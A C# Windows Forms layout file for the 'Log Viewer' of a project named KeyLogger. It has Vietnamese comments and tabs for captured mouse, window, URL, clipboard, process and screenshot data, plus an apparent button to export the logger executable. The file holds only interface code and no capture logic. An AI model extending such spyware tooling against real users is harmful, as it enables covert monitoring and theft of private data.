using System;
using System.Collections.Generic;
using System.Drawing;
using System.Windows.Forms;

namespace KeyLogger
{
    public partial class MainForm : Form
    {
        private Button BtnExportExe;
        private Button BtnImportLog;
        private TabControl tabControl;
        private FlowLayoutPanel ImagePanel;
        private Dictionary<string, TabPage> TabPages = new Dictionary<string, TabPage>();


        private void InitializeComponent()
        {
            this.BtnExportExe = new Button();
            this.BtnImportLog = new Button();
            this.tabControl = new TabControl();
            this.ImagePanel = new FlowLayoutPanel();

            this.SuspendLayout();

            // Top panel chứa nút
            var topPanel = new Panel
            {
                Dock = DockStyle.Top,
                Height = 70,
                Padding = new Padding(10)
            };

            // BtnExportExe
            this.BtnExportExe.Text = "Export";
            this.BtnExportExe.Font = new Font("Segoe UI", 12, FontStyle.Regular); // Không in đậm
            this.BtnExportExe.Size = new Size(160, 45);
            this.BtnExportExe.Location = new Point(50, 10);

            // BtnImportLog
            this.BtnImportLog.Text = "Import";
            this.BtnImportLog.Font = new Font("Segoe UI", 12, FontStyle.Regular); // Không in đậm
            this.BtnImportLog.Size = new Size(160, 45);
            this.BtnImportLog.Location = new Point(230, 10);

            topPanel.Controls.Add(this.BtnExportExe);
            topPanel.Controls.Add(this.BtnImportLog);

            // TabControl
            this.tabControl.Dock = DockStyle.Fill;
            this.tabControl.Alignment = TabAlignment.Top;
            this.tabControl.SizeMode = TabSizeMode.Normal;
            this.tabControl.Font = new Font("Segoe UI", 11, FontStyle.Regular); // Tăng size, không in đậm

            // Tên các tab
            string[] tabNames = { "Mouse", "Window", "Log", "URL", "System", "Clipboard", "Process", "Images" };
            foreach (var name in tabNames)
            {
                var tab = new TabPage(name);
                TabPages[name] = tab;

                if (name == "Images")
                {
                    this.ImagePanel = new FlowLayoutPanel
                    {
                        Dock = DockStyle.Fill,
                        AutoScroll = true,
                        WrapContents = true,
                        FlowDirection = FlowDirection.LeftToRight,
                        Padding = new Padding(10),
                        BackColor = Color.White
                    };
                    tab.Controls.Add(this.ImagePanel);
                }
                else
                {
                    var dgv = new DataGridView
                    {
                        Dock = DockStyle.Fill,
                        ReadOnly = true,
                        AllowUserToAddRows = false,
                        AutoSizeColumnsMode = DataGridViewAutoSizeColumnsMode.Fill,
                        Font = new Font("Segoe UI", 11), // Cỡ chữ lớn hơn
                        RowTemplate = { Height = 32 }    // Tăng chiều cao dòng
                    };
                    dgv.ColumnHeadersDefaultCellStyle.Font = new Font("Segoe UI", 11, FontStyle.Bold); // Header rõ ràng
                    dgv.DefaultCellStyle.Font = new Font("Segoe UI", 11); // Dữ liệu chính
                    tab.Controls.Add(dgv);
                }

                this.tabControl.TabPages.Add(tab);
            }

            // MainForm
            this.Text = "Log Viewer";
            this.WindowState = FormWindowState.Maximized;
            this.FormBorderStyle = FormBorderStyle.Sizable;
            this.MaximizeBox = true;
            this.MinimizeBox = true;

            this.Controls.Add(this.tabControl);
            this.Controls.Add(topPanel);

            this.ResumeLayout(true);
            this.PerformLayout();

        }
    }
}
